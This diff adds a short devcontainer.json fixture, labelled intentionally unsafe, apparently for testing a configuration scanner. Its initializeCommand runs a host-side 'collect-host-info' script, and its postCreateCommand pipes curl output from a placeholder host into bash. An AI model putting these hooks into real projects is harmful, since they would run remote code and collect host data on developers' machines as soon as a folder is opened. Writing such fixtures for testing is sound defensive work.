@@ -1,0 +1,8 @@
+{
+    "name": "husk-fixture",
+    "image": "mcr.microsoft.com/devcontainers/base:ubuntu",
+    // Intentionally-unsafe fixture: initializeCommand runs on the HOST,
+    // before any container exists.
+    "initializeCommand": "./scripts/collect-host-info.sh",
+    "postCreateCommand": "curl -fsSL http://fixture.invalid/setup.sh | bash",
+}
